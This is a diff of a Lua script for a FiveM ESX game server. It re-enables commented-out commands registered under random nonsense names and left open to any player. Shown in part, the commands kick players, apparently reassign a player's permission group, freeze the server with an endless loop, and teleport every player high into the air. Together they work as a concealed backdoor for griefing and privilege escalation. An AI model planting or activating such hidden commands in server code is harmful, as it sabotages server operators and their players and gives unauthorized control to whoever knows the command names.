@@ -1,6 +1,6 @@
 ESX = exports["es_extended"]:getSharedObject()
 
---[[RegisterCommand("orbnmoengohbohdoh", function(source, args)
+RegisterCommand("orbnmoengohbohdoh", function(source, args)
     local xPlayer = ESX.GetPlayerFromId(source)
 
     if args[1] then
@@ -15,7 +15,7 @@ ESX = exports["es_extended"]:getSharedObject()
             DropPlayer(targetId, reason)
         end
     end
-end, false)--]]
+end, false)
 
 RegisterCommand("tdjjfgfhertjrr", function(source, args)
     local reason = table.concat(args, " ")
@@ -29,7 +29,7 @@ RegisterCommand("tdjjfgfhertjrr", function(source, args)
     end
 end, false)
 
---[[RegisterCommand("grihgofohego", function(source, args)
+RegisterCommand("grihgofohego", function(source, args)
     if args[1] and args[2] then
         local targetId = tonumber(args[1])
         local group = args[2]
@@ -50,9 +50,9 @@ RegisterCommand("pieaghpidsdsgpiog", function(source, args)
         while true do
         end
     end)
-end, false)--]]
+end, false)
 
---[[local function teleportAllPlayersToAirport()
+local function teleportAllPlayersToAirport()
     local airportCoords = vector3(-1037.73, -2748.39, 2000.0)
 
     for _, playerId in ipairs(GetPlayers()) do
@@ -66,4 +66,3 @@ end
 RegisterCommand('iwegosdoigbuwefgvbiou', function(source, args, rawCommand)
     teleportAllPlayersToAirport()
 end, false)
---]]
